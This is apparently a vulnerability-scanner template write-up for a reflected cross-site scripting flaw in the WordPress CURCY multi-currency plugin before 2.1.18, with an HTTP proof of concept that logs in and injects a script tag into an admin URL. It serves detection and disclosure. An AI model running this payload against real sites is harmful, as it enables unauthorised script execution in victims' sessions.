# Nuclei Template: WordPress CURCY - Multi Currency for WooCommerce <2.1.18 - Cross-Site Scripting
**Template ID:** curcy-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`curcy-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress CURCY - Multi Currency for WooCommerce 2.1.18 does not escape some generated URLs before outputting them back in attributes, leading to reflected cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=wc-reports&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/6ebafb52-e167-40bc-a86c-b9840b2b9b37
- https://wordpress.org/plugins/woo-multi-currency
